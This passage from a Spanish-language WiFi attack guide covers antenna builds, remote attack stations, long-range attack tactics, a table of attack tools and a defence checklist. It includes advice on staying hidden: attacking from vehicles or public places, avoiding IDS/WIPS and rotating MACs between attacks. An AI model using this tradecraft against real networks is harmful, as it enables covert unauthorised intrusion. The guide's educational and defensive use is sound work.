  tshark -i $IFACE -Y "wlan.da == $BSSID" -T fields -e radiotap.dbm_antsignal 2>/dev/null \
    | tail -5 | sort -rn | head -1
  sleep 5
done
EOF
```

### Cantenna (DIY Antenna de Lata)

La cantenna es una antena direccional casera hecha con una lata de Pringles o similar:

```bash
# Materiales:
# - Lata de Pringles vacía (limpia)
# - Conector SMA hembra (chassis mount)
# - Cable de cobre rígido (1.5mm diámetro)
# - Estaño para soldar
# - Cinta aisladora

# Dimensiones para 2.4GHz:
# Diámetro de lata: ideal 7.5-10cm
# Longitud de lata: ~20cm mínimo
# Elemento activo: 31mm (lambda/4 para 2.4GHz)
# Desde el fondo de la lata hasta el elemento: 95mm

# Construcción:
# 1. Perforar la lata a 95mm del fondo
# 2. Montar conector SMA
# 3. Soldar cable de 31mm al pin central del SMA
# 4. Cerrar la lata
# 5. Conectar a adaptador WiFi

# Ganancia estimada: 8-12 dBi
# Haz: ~30-40°
# Mejor que ninguna antena direccional, peor que una Yagi/Panel comercial

# Pro:
# - Cuesta $2-5 hacerla
# - Mejora drásticamente vs antena omnidireccional
# - Divertido de construir

# Contra:
# - No waterproof
# - Frágil
# - Menos ganancia que una antena comercial
```

### Outdoor Cable Routing

```bash
# Para instalaciones fijas de largo alcance:
# El adaptador WiFi va en el exterior (cerca de la antena)
# El control (Raspberry Pi/laptop) va en el interior
# La conexión entre exterior e interior:

# Opción 1: Cable USB extendido (hasta 15m con repetidores)
# USB 2.0 activo: 5m sin repeater, hasta 25m con repetidores
# Límite práctico: 15m con repetidores de calidad

# Opción 2: Cable Ethernet (hasta 100m)
# Usar Ethernet extenders USB (USB over IP)
# O Raspberry Pi en el exterior + control remoto por SSH

# Opción 3: Fibra óptica (hasta 1km)
# USB over Fiber (caro, profesional)
# Para estaciones fijas de largo plazo

# Opción 4: Cable coaxial para antena (no para adaptador)
# Como vimos en la tabla de cable loss:
# - LMR-400: 1.1dB/10m en 2.4GHz, máximo recomendable 20m
# - LMR-600: 0.7dB/10m, máximo 30m
# - Heliax: 0.3dB/10m, máximo 50m

# RECOMENDACIÓN: Raspberry Pi en caja estanca en el exterior
# ssh desde adentro. Sin cables largos WiFi, solo Ethernet
# o USB para datos.
```

### PoE (Power over Ethernet) para Estaciones Remotas

```bash
# Si instalás una estación de ataque remota (en un techo, poste, árbol):
# Ethernet lleva datos Y energía

# Componentes PoE:
# - Inyector PoE (adentro, cerca de la fuente de poder)
# - Cable Ethernet (hasta 100m)
# - Splitter PoE (afuera, cerca del dispositivo)

# Raspberry Pi + PoE:
# - Raspberry Pi PoE HAT (oficial)
# - O splitter PoE a USB-C (para Pi 4/5)

# Consumo típico PoE:
# Pi 4 + AWUS036ACH: ~10W = ~0.8A a 12V
# PoE 802.3af: 15.4W (suficiente)
# PoE 802.3at: 25.5W (más que suficiente)

# Esquema:
# [Router/Internet] --- [Inyector PoE] ===[100m]=== [Splitter PoE] + [Pi + WiFi]

# Si no hay internet, usá panel solar + batería (visto arriba)
```

### Sector Antennas para Wide Area

Las antenas sectoriales cubren un ángulo amplio pero direccional:

```bash
# Sector 90°: cubre un cuarto de círculo
# Sector 120°: cubre un tercio de círculo
# Sector 180°: cubre medio círculo

# Con 3 antenas de sector 120°, cubrís 360°:
# Sector A: 0-120°
# Sector B: 120-240°
# Sector C: 240-360°

# Cada sector conectado a un adaptador WiFi distinto
# Ideal para wardriving de área amplia

# Ganancia típica de sectoriales: 10-16 dBi
# Pierden ganancia vs parabólica pero cubren más área

# Aplicación para ataques:
# Si el objetivo se mueve (wardriving), la sectorial
# capta más señal que una omnidireccional de menor ganancia
# pero no necesitás apuntar con precisión milimétrica
```

### Parabolic Grid Antenna Selection

```bash
# Parabólicas de rejilla (grid):
# - Más baratas que parabólicas sólidas (~$50-150)
# - Menos peso y resistencia al viento
# - Ganancia: 24-30 dBi
# - Polarización: lineal (ajustable vertical/horizontal)
# - Foco ajustable

# Proveedores recomendados:
# - L-Com (HyperGain)
# - Ubiquiti (AirGrid, PowerBridge)
# - MikroTik (mANT, LHG)
# - TP-Link (C210, CPE510... aunque no son grid puras)

# Especificaciones a verificar:
# - Frecuencia: 2.4GHz (2.4-2.483GHz) o 5GHz (5.15-5.85GHz)
# - Ganancia: dBi nominal
# - VSWR: menor a 1.5:1 (ideal menor a 1.3:1)
# - Polarización: vertical u horizontal
# - Conector: N-type (el estándar profesional)
# - Resistencia al viento: 200+ km/h nominal

# Instalación:
# 1. Armar la rejilla (viene desarmada)
# 2. Conectar feedhorn (el elemento activo en el foco)
# 3. Ajustar polarización (vertical para la mayoría de APs)
# 4. Conectar cable LMR-400 con conector N-type
# 5. Apuntar al objetivo (uso brújula y mapa)
# 6. Ajuste fino con RSSI en tiempo real
```

### Consideraciones de Seguridad para Ataques de Larga Distancia

```bash
# Ventajas de atacar desde lejos:
# 1. No te ven físicamente (sin línea de vista directa)
# 2. Dificulta que te encuentren
# 3. Podés atacar desde un vehículo o espacio público

# Desventajas:
# 1. Señal débil (más pérdidas, menos SNR)
# 2. Sensible a condiciones climáticas
# 3. Equipo voluminoso y obvio
# 4. Alineación de antena complicada
# 5. No podés ver si el objetivo cambia de canal

# Recomendaciones:
# - Usar 2.4GHz para larga distancia (menos pérdida)
# - Elegir días despejados
# - Montar en vehículo para movilidad
# - Llevar binoculares para ver el objetivo
# - Si usás 5GHz, solo en distancias menores a 1km

# Distancias máximas prácticas:
# Omnidireccional 9dBi: ~500m
# Yagi 18dBi: ~1.5km
# Panel 20dBi: ~2km
# Grid 30dBi: ~5km+
# Cantenna: ~500m-1km (depende de la calidad)

# (Todas las distancias asumen línea de vista despejada)
```

---

## Herramientas — Resumen Detallado

| Herramienta | Propósito | Uso principal |
|-------------|-----------|---------------|
| **[aircrack-ng](../raw/w1f1-4tt4cks.md#aircrack-ng)** | Suite completa | Captura [handshake](../raw/w1f1-4tt4cks.md#handshake), deauth, [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) CPU |
| **airodump-ng** | Escaneo/captura | Ver [redes](../raw/r3d3s-f0nd4m3nt0s.md), capturar tráfico |
| **aireplay-ng** | Inyección | Deauth, fake auth, [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) replay |
| **airmon-ng** | Modo monitor | Activar/desactivar monitor mode |
| **hcxdumptool** | Captura PMKID | Atacar sin clientes |
| **hcxpcapngtool** | Conversión | .pcapng a .hc22000 |
| **[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)** | Cracking GPU | [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) GPU acelerada |
| **[reaver](../raw/w1f1-4tt4cks.md#reaver)** | [wps](../raw/w1f1-4tt4cks.md#wps) PIN | Pixie Dust, PIN brute force |
| **bully** | WPS (alternativa) | PIN brute force, más configurable |
| **pixiewps** | WPS offline | Pixie Dust attack |
| **[bettercap](../raw/m1tm-m0b1l3.md#bettercap)** | Suite moderna | [evil twin](../raw/w1f1-4tt4cks.md#evil-twin), ARP, [mitm](../raw/m1tm-m0b1l3.md), captura |
| **wifite** | Auto | Todo-en-uno automático |
| **airgeddon** | Menú interactivo | Wraper de múltiples herramientas |
| **mdk4** | DoS | Beacon flood, deauth, auth DoS |
| **kismet** | Monitoreo pasivo | Detección de redes, wardriving |
| **wash** | WPS scan | Detectar redes con WPS |
| **[tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump)** | Captura CLI | Captura manual de paquetes |
| **[wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)** | Análisis visual | Análisis de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) |
| **hostapd** | AP falso | Evil Twin, RADIUS rogue |
| **dnsmasq** | [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp)/[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) | Configurar [red](../raw/r3d3s-f0nd4m3nt0s.md) del AP falso |
| **macchanger** | MAC spoof | Cambiar dirección MAC |

---

## Precauciones y Defensas

| Riesgo | Mitigación |
|--------|-----------|
| Detección por [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))/WIPS | Usar modo monitor pasivo, evitar inyección innecesaria |
| Rastreo por MAC | Rotar MAC con `macchanger -r` entre ataques |
| Cámaras de seguridad | [wifi](../raw/w1f1-4tt4cks.md) no es el único vector; estar en espacio público no es garantía |
| Interferencia | Verificar canales libres, usar 5GHz |
| Legal | Solo [redes](../raw/r3d3s-f0nd4m3nt0s.md) propias o con autorización por escrito |
| [firmware](../raw/u3f1-r00tk1ts.md#firmware) updates | Algunos routers parchan PMKID, [wps](../raw/w1f1-4tt4cks.md#wps), etc. con updates |

### Cómo Defender tu [red](../raw/r3d3s-f0nd4m3nt0s.md) WiFi

```bash
# 1. WPA3 si es posible (sino WPA2 con AES, NUNCA TKIP)
# 2. Contraseña larga (20+ caracteres, aleatoria)
# 3. PMF (Protected Management Frames) habilitado
# 4. WPS deshabilitado (si no se puede, al menos bloquear PIN)
# 5. No usar WPS si es evitable
# 6. Firmware actualizado
# 7. Deshabilitar administración remota del router
# 8. Usar VLAN para segmentar dispositivos IoT
# 9. Monitorear logs del AP por deauths masivos
# 10. Usar WIDS (Wireless Intrusion Detection System)
```



